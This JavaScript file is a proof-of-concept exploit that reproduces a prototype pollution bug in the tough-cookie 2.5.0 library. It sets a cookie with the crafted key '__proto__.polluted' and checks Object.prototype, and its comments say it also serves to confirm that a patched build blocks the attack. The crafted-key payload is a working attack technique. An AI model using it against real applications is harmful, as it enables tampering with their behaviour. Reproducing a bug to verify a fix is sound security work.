// index.js

// This script demonstrates an exploit for the prototype pollution vulnerability
// in tough-cookie@2.5.0. The vulnerability allows an attacker to modify the
// prototype of built-in JavaScript objects, leading to potential security issues.

// After running `npm install tough-cookie@2.5.0 && node index.js`, the output should
// contain "EXPLOITED SUCCESSFULLY".
// After running `npm install ./tough-cookie-2.5.0-PATCHED.tgz && node index.js`, the
// output should be "EXPLOIT FAILED".

const tough = require('tough-cookie');
const Cookie = tough.Cookie;
const CookieJar = tough.CookieJar;

console.log('Tough Cookie Version:', require('tough-cookie/package.json').version);

// Create a new CookieJar instance
const jar = new CookieJar();

try {
  // Attempt to exploit the vulnerability by setting a cookie with a specially crafted key
  const cookie = new Cookie({
    key: '__proto__.polluted',
    value: 'EXPLOITED',
    domain: 'example.com',
    path: '/'
  });

  console.log('Setting cookie:', cookie);

  jar.setCookieSync(cookie, 'http://example.com');

  console.log('Cookie set, checking for pollution...');

  // Check if the exploit was successful by examining if the prototype was polluted
  console.log('Current Object.prototype.polluted:', Object.prototype.polluted);

  if (Object.prototype.polluted === 'EXPLOITED') {
    console.log('EXPLOITED SUCCESSFULLY');
  } else {
    console.log('EXPLOIT FAILED');
  }
} catch (error) {
  console.error('Error:', error);
}

